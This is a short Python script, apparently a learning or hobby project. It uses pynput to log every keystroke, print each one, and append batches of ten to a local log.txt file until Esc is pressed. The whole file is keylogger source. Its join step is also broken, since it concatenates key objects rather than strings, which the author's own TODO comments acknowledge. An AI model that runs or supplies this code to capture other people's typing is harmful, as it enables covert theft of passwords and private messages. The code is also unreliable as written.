import pynput
from pynput.keyboard import Key, Listener

count = 0
""" A global int variable to count the number of key the user has key-in """

keys = []
""" A list buffer to store the key that has been pressed on keyboard """


def on_press(key):
    """
    Function to listen the key signal on keyboard and display in defined string format

    :param key: User's key on keyboard
    :type key:

    TODO:
        * Debugging required
        * Writing to file should be a str, not Keycode
    """

    global keys, count
    keys.append(key)    # Add the keyboard signal to the keys list
    count += 1          # Increment to count the number of keys that have been pressed on the keyboard
    print("{0} pressed".format(key))

    # Write on the specific text file given when there are 10 keys inserted, then reset the global var
    if count >= 10:
        print(str(''.join(keys)))           # TODO
        write_file(str(''.join(keys)))
        count = 0
        keys = []


def write_file(data):
    """
    Function to write the key-stroke messages on text file

    :param data:    Key-stroke message in str
    :type data:     str
    """
    with open("log.txt", "a") as f:
        for key in data:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    """
    Function to execute the exit of this key-logger program

    :param key: User's key on keyboard
    :type key:
    :return:    False if the user presses the Esc key
    :rtype:     bool
    """
    if key == Key.esc:  # When user input Esc key
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
